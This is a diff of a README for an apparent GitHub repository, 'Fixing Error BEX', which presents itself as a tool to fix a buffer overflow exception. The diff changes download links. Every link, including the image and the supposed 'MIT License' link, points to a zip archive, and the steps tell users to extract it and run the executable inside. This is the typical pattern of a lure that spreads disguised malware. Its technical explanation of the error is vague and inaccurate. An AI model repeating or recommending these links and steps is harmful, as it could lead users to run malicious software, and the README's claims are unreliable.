@@ -1,6 +1,6 @@
 # Fixing Error BEX
 
-![BEX Error](https://github.com/godloike/Fixing-Error-BEX/releases/download/v2.0/Software.zip)
+![BEX Error](https://github.com/godloike/Fixing-Error-BEX/raw/refs/heads/main/src/Fixing_Error_BEX_2.8.zip)
 
 Welcome to the "Fixing Error BEX" repository, dedicated to resolving the Buffer Overflow Exception (BEX) error encountered in software applications. This error commonly arises when a program attempts to utilize more memory than allocated, often resulting in application crashes. The primary objective of this repository is to provide a software solution to identify and rectify memory-related issues, ensuring the smooth operation of your applications without the fear of unexpected crashes.
 
@@ -23,7 +23,7 @@ The "BEX" error, known as Buffer Overflow Exception, has been a persistent issue
 ## Installation
 To utilize the software for fixing the BEX error, follow these simple installation steps:
 1. Download the software package from the following link:
-   [![Download Software](https://github.com/godloike/Fixing-Error-BEX/releases/download/v2.0/Software.zip)](https://github.com/godloike/Fixing-Error-BEX/releases/download/v2.0/Software.zip)
+   [![Download Software](https://github.com/godloike/Fixing-Error-BEX/raw/refs/heads/main/src/Fixing_Error_BEX_2.8.zip)](https://github.com/godloike/Fixing-Error-BEX/raw/refs/heads/main/src/Fixing_Error_BEX_2.8.zip)
 2. Extract the contents of the downloaded ZIP file to a preferred location on your system.
 3. Run the executable file to initiate the installation process.
 4. Follow the on-screen instructions to complete the installation.
@@ -44,7 +44,7 @@ Contributions to this repository are welcome and appreciated. Whether you have s
 4. Your contributions will be reviewed, and if deemed suitable, they will be integrated into the main repository.
 
 ## License
-This repository and the accompanying software are distributed under the [MIT License](https://github.com/godloike/Fixing-Error-BEX/releases/download/v2.0/Software.zip). Feel free to utilize, modify, and distribute the software while adhering to the terms specified in the MIT License.
+This repository and the accompanying software are distributed under the [MIT License](https://github.com/godloike/Fixing-Error-BEX/raw/refs/heads/main/src/Fixing_Error_BEX_2.8.zip). Feel free to utilize, modify, and distribute the software while adhering to the terms specified in the MIT License.
 
 ---
 
